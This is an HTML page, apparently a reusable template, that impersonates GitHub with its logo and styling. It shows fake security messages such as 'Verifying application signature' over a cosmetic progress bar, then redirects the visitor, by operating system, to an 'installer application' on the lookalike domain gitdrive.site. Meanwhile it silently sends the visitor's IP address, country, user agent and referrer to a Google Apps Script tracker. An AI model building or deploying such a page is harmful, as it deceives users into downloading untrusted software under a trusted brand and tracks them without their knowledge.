<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg">
    <title>Redirecting | GitHub</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
        body { background: #0d1117; color: #e6edf3; min-height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }

        .container { text-align: center; max-width: 500px; width: 90%; padding: 2rem; }

        .github-icon { width: 80px; height: 80px; margin: 0 auto 2rem; position: relative; }
        .octocat-arm { position: absolute; top: 35px; right: -8px; width: 20px; height: 12px; background: #e6edf3; border-radius: 4px; transform-origin: left center; animation: wave 2s ease-in-out infinite; }

        .logo-text { font-size: 2.5rem; font-weight: 600; margin-bottom: .5rem; color: #f0f6fc; }
        .subtitle { font-size: 1.1rem; color: #7d8590; margin-bottom: 3rem; line-height: 1.5; }

        .loader-container { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 2.5rem 2rem; margin-bottom: 2rem; }

        .progress-info { display: flex; justify-content: space-between; margin-bottom: 1rem; font-size: .9rem; color: #7d8590; }
        .progress-bar { width: 100%; height: 8px; background: #21262d; border-radius: 4px; overflow: hidden; margin-bottom: 1.5rem; }
        .progress-fill { height: 100%; width: 0%; background: #238636; border-radius: 4px; transition: width .3s ease; position: relative; overflow: hidden; }
        .progress-fill::after { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,.2), transparent); animation: shine 2s infinite; }

        .status-line { display: flex; align-items: center; justify-content: center; gap: .5rem; margin-bottom: 1.5rem; font-size: .95rem; }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #238636; animation: pulse 2s infinite; }

        .branch-info { display: inline-flex; align-items: center; gap: .5rem; padding: .5rem 1rem; background: #1f6feb; border-radius: 6px; font-size: .9rem; margin-bottom: 1rem; }

        .commit-grid { display: grid; grid-template-columns: repeat(10, 1fr); gap: 4px; margin: 1.5rem 0; }
        .commit-cell { aspect-ratio: 1; background: #21262d; border-radius: 2px; transition: all .3s ease; }
        .commit-cell.active { background: #238636; }

        .redirect-message { color: #7d8590; font-size: .95rem; margin-top: 1.5rem; }

        .github-corner { position: absolute; top: 0; right: 0; }

        @keyframes wave { 0%, 100% { transform: rotate(0deg); } 50% { transform: rotate(-20deg); } }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
        @keyframes shine { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }

        @media (max-width: 768px) {
            .container { padding: 1rem; }
            .logo-text { font-size: 2rem; }
            .github-icon { width: 60px; height: 60px; }
            .octocat-arm { top: 25px; right: -6px; width: 16px; height: 10px; }
        }
    </style>
</head>
<body>

    <!-- ============================================================
         GITHUB CORNER LINK — update href to your actual GitHub repo
         ============================================================ -->
    <a href="https://github.com" class="github-corner" aria-label="View on GitHub">
        <svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position:absolute; top:0; border:0; right:0;" aria-hidden="true">
            <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
            <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin:130px 106px;" class="octo-arm"></path>
            <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path>
        </svg>
    </a>

    <div class="container">
        <div class="github-icon">
            <svg height="80" viewBox="0 0 16 16" width="80" fill="#e6edf3">
                <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
            </svg>
            <div class="octocat-arm"></div>
        </div>

        <h1 class="logo-text">GitHub</h1>
        <p class="subtitle">Preparing to redirect to installer application</p>

        <div class="loader-container">
            <div class="progress-info">
                <span>Processing request</span>
                <span id="percentage">0%</span>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progress"></div>
            </div>
            <div class="status-line">
                <div class="status-dot"></div>
                <span id="status">Initializing security protocols</span>
            </div>
            <div class="branch-info">
                <svg height="16" viewBox="0 0 16 16" width="16" fill="#e6edf3">
                    <path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path>
                </svg>
                <span>main → installer-app</span>
            </div>
            <div class="commit-grid" id="commitGrid"></div>
        </div>

        <p class="redirect-message">You will be redirected to the installation page shortly</p>
    </div>

    <script>
    (function () {

        // ============================================================
        // CONFIGURATION — fill these in before deploying
        // ============================================================
        const CONFIG = {
            // Your Google Apps Script web app URL (Deploy → Web app → Copy URL)
            TRACKER_URL: 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec',

            // Redirect destinations by OS
            REDIRECT: {
                windows: 'https://gitdrive.site/',
                macos:   'https://gitdrive.site//',
                ios:     'https://gitdrive.site/',   // fallback
                android: 'https://gitdrive.site//',   // fallback
                linux:   'https://gitdrive.site/',   // fallback
                other:   'https://gitdrive.site//',   // fallback
            },

            // Milliseconds to wait after progress bar reaches 100% before redirecting
            REDIRECT_DELAY_MS: 200,
        };
        // ============================================================


        // ── Utility: read ?key= or #key= from URL ───────────────────
        function getParam(name) {
            const fromSearch = new URLSearchParams(location.search).get(name);
            if (fromSearch !== null) return fromSearch;
            const fromHash = new URLSearchParams(location.hash.replace(/^#/, '')).get(name);
            return fromHash || '';
        }

        // ── Preserve the original query string + hash on redirect ───
        function withQueryAndHash(url) {
            return url + (location.search || '') + (location.hash || '');
        }

        // ── OS detection ─────────────────────────────────────────────
        function detectOS() {
            // Allow ?os= override (windows | macos | ios | android | linux | other)
            const forced = (getParam('os') || '').toLowerCase();
            if (Object.keys(CONFIG.REDIRECT).includes(forced)) return forced;

            // Modern API first
            const uadPlatform = (navigator.userAgentData?.platform || '').toLowerCase();
            if (uadPlatform.includes('windows')) return 'windows';
            if (uadPlatform.includes('mac'))     return 'macos';
            if (uadPlatform.includes('ios'))     return 'ios';
            if (uadPlatform.includes('android')) return 'android';
            if (uadPlatform.includes('linux'))   return 'linux';

            // UA string fallback
            const ua = navigator.userAgent || '';
            if (/iPhone|iPad|iPod/i.test(ua))         return 'ios';
            if (/Android/i.test(ua))                  return 'android';
            if (/Windows NT/i.test(ua))               return 'windows';
            if (/Macintosh;.*Mac OS X/i.test(ua))     return 'macos';
            if (/Linux/i.test(ua))                    return 'linux';

            return 'other';
        }

        // ── IP lookup ─────────────────────────────────────────────────
        async function getIP() {
            try {
                const res = await fetch('https://api64.ipify.org?format=json', { cache: 'no-store' });
                const json = await res.json();
                return json.ip || '';
            } catch { return ''; }
        }

        // ── Geo lookup (country from IP) ──────────────────────────────
        async function getGeo(ip) {
            try {
                if (!ip) return { country: '', countryCode: '' };
                const res = await fetch(`https://ipapi.co/${ip}/json/`, { cache: 'no-store' });
                const json = await res.json();
                return { country: json.country_name || '', countryCode: json.country || '' };
            } catch { return { country: '', countryCode: '' }; }
        }

        // ── Fire tracking pixel to Google Apps Script ─────────────────
        // Your Apps Script receives this as ?p=<JSON> in the query string.
        // In your script use: e.parameter.p  then JSON.parse() it.
        function fireTrackingPixel(data) {
            try {
                const payload = {
                    ip:              data.ip,
                    country:         data.country,
                    countryCode:     data.countryCode,
                    operatingSystem: data.os,
                    userAgent:       navigator.userAgent,
                    referrer:        document.referrer || '',
                    timestamp:       new Date().toISOString(),
                    redirectUrl:     data.targetUrl,
                    offer:           data.offer,
                    eventType:       'redirect_visit',
                };
                const qs = new URLSearchParams({ p: JSON.stringify(payload) }).toString();
                // 1×1 image pixel — fast, non-blocking, no CORS issues
                const pixel = new Image(1, 1);
                pixel.src = `${CONFIG.TRACKER_URL}?${qs}&_t=${Date.now()}`;
            } catch (_) { /* never block the redirect */ }
        }

        // ── Commit-grid decoration ────────────────────────────────────
        function buildCommitGrid() {
            const grid = document.getElementById('commitGrid');
            for (let i = 0; i < 70; i++) {
                const cell = document.createElement('div');
                cell.classList.add('commit-cell');
                if (Math.random() > 0.4) cell.style.opacity = (Math.random() * 0.5 + 0.3).toString();
                grid.appendChild(cell);
            }
        }

        // ── Animated progress bar, then redirect ─────────────────────
        function animateAndRedirect(targetUrl) {
            const progressEl  = document.getElementById('progress');
            const percentEl   = document.getElementById('percentage');
            const statusEl    = document.getElementById('status');
            const cells       = document.querySelectorAll('.commit-cell');

            const steps = [
                { at: 20,  text: 'Verifying application signature' },
                { at: 45,  text: 'Establishing secure connection' },
                { at: 70,  text: 'Preparing download session' },
                { at: 90,  text: 'Finalizing redirect sequence' },
            ];
            let stepped = 0;
            let value   = 0;

            const interval = setInterval(() => {
                value++;
                progressEl.style.width = value + '%';
                percentEl.textContent  = value + '%';

                // Update status message at milestones
                if (stepped < steps.length && value >= steps[stepped].at) {
                    statusEl.textContent = steps[stepped].text;
                    stepped++;
                }

                // Randomly light up commit cells
                if (value % 5 === 0) {
                    const cell = cells[Math.floor(Math.random() * cells.length)];
                    if (cell) {
                        cell.classList.add('active');
                        setTimeout(() => cell.classList.remove('active'), 1000);
                    }
                }

                if (value >= 100) {
                    clearInterval(interval);
                    setTimeout(() => location.replace(targetUrl), CONFIG.REDIRECT_DELAY_MS);
                }
            }, 40); // ~4 seconds total
        }

        // ── Main ──────────────────────────────────────────────────────
        window.addEventListener('load', async () => {
            buildCommitGrid();

            const os     = detectOS();
            const offer  = getParam('offername') || getParam('offer') || getParam('offer_name') || '';
            const targetUrl = withQueryAndHash(CONFIG.REDIRECT[os] || CONFIG.REDIRECT.other);

            // Kick off tracking in background (non-blocking)
            getIP().then(ip =>
                getGeo(ip).then(geo =>
                    fireTrackingPixel({ os, offer, targetUrl, ip, ...geo })
                )
            );

            animateAndRedirect(targetUrl);
        });

    })();
    </script>
</body>
</html>
